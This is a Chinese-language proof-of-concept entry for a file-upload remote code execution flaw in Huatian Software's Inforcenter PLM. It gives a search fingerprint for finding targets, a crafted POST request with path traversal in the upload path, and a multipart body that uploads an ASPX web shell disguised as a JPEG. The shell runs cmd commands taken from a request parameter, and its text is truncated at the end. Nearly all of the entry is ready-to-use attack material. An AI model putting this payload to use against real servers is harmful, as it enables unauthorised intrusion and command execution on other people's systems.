# 华天软件InforcenterPLMuploadFileToIIS文件上传致RCE漏洞

- **系统**：华天软件InforcenterPLMuploadFileToIIS文件上传致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/Base/BaseHandler.ashx"`
- **请求**：`POST /Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/ HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: image/jpeg
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
Syste…（脚本共 700 字，完整版见原文）
```
- **预期**：200　|　—